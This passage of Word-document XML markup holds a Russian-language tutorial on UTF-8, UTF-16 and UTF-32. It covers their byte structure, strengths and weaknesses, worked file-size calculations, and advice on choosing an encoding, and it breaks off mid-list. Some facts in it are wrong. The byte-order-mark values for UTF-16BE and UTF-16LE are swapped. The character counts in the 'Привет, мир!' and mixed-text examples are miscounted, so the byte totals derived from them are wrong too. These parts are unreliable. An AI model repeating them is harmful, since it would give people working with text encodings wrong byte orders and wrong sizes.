        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Символы U+0800 до U+FFFF кодируются тремя байтами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Символы U+10000 до U+10FFFF кодируются четырьмя байтами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура кодирования:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Диапазон code points | Количество байтов | Битовая структура                    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------------------|-------------------|--------------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| U+0000 – U+007F      | 1                 | 0xxxxxxx                             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| U+0080 – U+07FF      | 2                 | 110xxxxx 10xxxxxx                    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| U+0800 – U+FFFF      | 3                 | 1110xxxx 10xxxxxx 10xxxxxx           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| U+10000 – U+10FFFF   | 4                 | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx  |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Первый байт многобайтовой последовательности указывает длину последовательности количеством единиц в начале (110... — 2 байта, 1110... — 3 байта, 11110... — 4 байта). Все последующие байты начинаются с битовой последовательности 10.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества UTF-8:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обратная совместимость с ASCII**: любой ASCII-текст является корректным UTF-8</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Самосинхронизация**: можно определить начало символа, просматривая поток байтов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компактность для латиницы**: английский текст занимает столько же места, как в ASCII</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отсутствие проблем с порядком байтов** (endianness)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки UTF-8:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Неэффективность для текстов на языках, требующих 3-4 байта (китайский, японский)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Переменная длина символа усложняет индексацию</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> По данным W3Techs, более 98% веб-сайтов используют UTF-8 (2024 год). Это де-факто стандарт для Интернета.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>UTF-16 (16-bit Unicode Transformation Format)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-16</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> использует 2 или 4 байта для представления символов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип кодирования:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Символы BMP (U+0000 до U+FFFF) кодируются одной 16-битной единицей (2 байта)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Символы за пределами BMP (U+10000 до U+10FFFF) кодируются парой 16-битных единиц — **суррогатной парой** (4 байта)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суррогатные пары:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Для кодирования символов за пределами BMP используются два специальных диапазона:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**High surrogates**: U+D800 – U+DBFF (1024 значения)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Low surrogates**: U+DC00 – U+DFFF (1024 значения)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Комбинация high и low surrogate образует код символа: 1024 × 1024 = 1 048 576 дополнительных символов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Порядок байтов (Endianness):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>UTF-16 может быть:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UTF-16BE** (Big Endian): старший байт первый</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UTF-16LE** (Little Endian): младший байт первый</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для определения порядка байтов в начале файла используется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BOM (Byte Order Mark)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — специальный символ U+FEFF:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В UTF-16BE: FF FE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В UTF-16LE: FE FF</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> UTF-16 используется внутри многих платформ (Java, .NET, Windows API, JavaScript), так как обеспечивает компромисс между простотой обработки и универсальностью.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества UTF-16:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Большинство современных символов кодируются двумя байтами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Эффективна для азиатских языков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки UTF-16:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Несовместима с ASCII</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проблема endianness требует BOM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Необходимость обработки суррогатных пар усложняет код</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>UTF-32 (32-bit Unicode Transformation Format)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-32</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> использует фиксированную длину — 4 байта (32 бита) для каждого символа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип кодирования:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Каждый code point Unicode напрямую представляется как 32-битное целое число. Например:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>'A' (U+0041) → 00 00 00 41 (в шестнадцатеричном)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>'中' (U+4E2D) → 00 00 4E 2D</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>'😀' (U+1F600) → 00 01 F6 00</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества UTF-32:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Фиксированная длина**: каждый символ занимает ровно 4 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Простота индексации**: n-й символ находится по адресу base_address + n × 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отсутствие суррогатных пар** и других сложностей кодирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки UTF-32:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Большой размер**: текст занимает в 4 раза больше места по сравнению с ASCII/UTF-8</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Неэффективность**: 99% символов в большинстве текстов можно закодировать меньшим количеством байтов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> UTF-32 редко используется для хранения и передачи данных, но иногда применяется внутри программ для упрощения обработки строк.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Как и UTF-16, UTF-32 может быть UTF-32BE или UTF-32LE.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Расчёт размера текстовых файлов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Общий подход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Размер текстового файла зависит от:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Количества символов в тексте</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Кодировки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Дополнительных данных (BOM, метаинформация)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для простых кодировок с фиксированной длиной:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Размер (байт) = Количество символов × Байт на символ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для UTF-8 расчёт сложнее, так как разные символы занимают разное количество байтов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры расчётов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Размер английского текста</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Текст: "Hello, World!" (13 символов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ASCII</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-8</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Все символы латинские и знаки пунктуации → 1 байт на символ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 13 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-16</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый символ → 2 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 13 × 2 = 26 байт (+2 байта BOM = 28 байт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-32</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый символ → 4 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 13 × 4 = 52 байта (+4 байта BOM = 56 байт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Размер русского текста</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Текст: "Привет, мир!" (12 символов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Windows-1251</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>КОИ-8</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Все символы → 1 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 12 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-8</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кириллические символы (10 шт.) → 2 байта каждый = 20 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Знаки пунктуации и пробел (2 шт.) → 1 байт каждый = 2 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 20 + 2 = 22 байта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-16</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Все символы → 2 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 12 × 2 = 24 байта (+2 байта BOM = 26 байт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Смешанный текст</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Текст: "Hello, мир! 你好 😀" (17 символов: 7 латинских + пробелы + знаки, 4 кириллических, 2 китайских иероглифа, 1 эмодзи)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-8</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Латинские символы, пробелы, знаки (9 шт.): 1 × 9 = 9 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кириллические символы (4 шт.): 2 × 4 = 8 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Китайские иероглифы (2 шт.): 3 × 2 = 6 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Эмодзи (1 шт.): 4 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 9 + 8 + 6 + 4 = 27 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-16</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Латинские, кириллические, китайские (15 шт.): 2 × 15 = 30 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Эмодзи (1 шт., суррогатная пара): 4 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 30 + 4 = 34 байта (+2 байта BOM = 36 байт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-32</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Все символы: 4 × 17 = 68 байт (+4 байта BOM = 72 байта)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Большой текстовый файл</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Книга на русском языке: 500 000 символов (примерно 250 страниц)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Предположим, что в тексте:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>90% кириллических символов (450 000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>10% латинских, цифр, пунктуации, пробелов (50 000)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Windows-1251</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 500 000 байт = 488.28 КБ ≈ 0.48 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-8</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кириллица: 450 000 × 2 = 900 000 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Остальное: 50 000 × 1 = 50 000 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 950 000 байт = 927.73 КБ ≈ 0.91 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-16LE</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 500 000 × 2 = 1 000 000 байт = 976.56 КБ ≈ 0.95 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вывод: для русского текста UTF-8 примерно в 2 раза больше, чем Windows-1251, но универсальнее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 5:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Текст на китайском языке</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Текст: 10 000 иероглифов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-8</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Большинство китайских иероглифов → 3 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер ≈ 10 000 × 3 = 30 000 байт ≈ 29.3 КБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-16</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Иероглифы BMP → 2 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер = 10 000 × 2 = 20 000 байт ≈ 19.5 КБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>GB2312/GBK</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (китайская национальная кодировка):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер ≈ 10 000 × 2 = 20 000 байт ≈ 19.5 КБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вывод: для китайского текста UTF-16 эффективнее UTF-8.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практическая значимость и применение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Выбор кодировки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При разработке программного обеспечения важно правильно выбрать кодировку:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Используйте UTF-8:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для веб-приложений и API</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для хранения многоязычных данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для файлов конфигурации и логов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для обмена данными между системами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Используйте UTF-16:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Внутри приложений на Java, C#, JavaScript</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
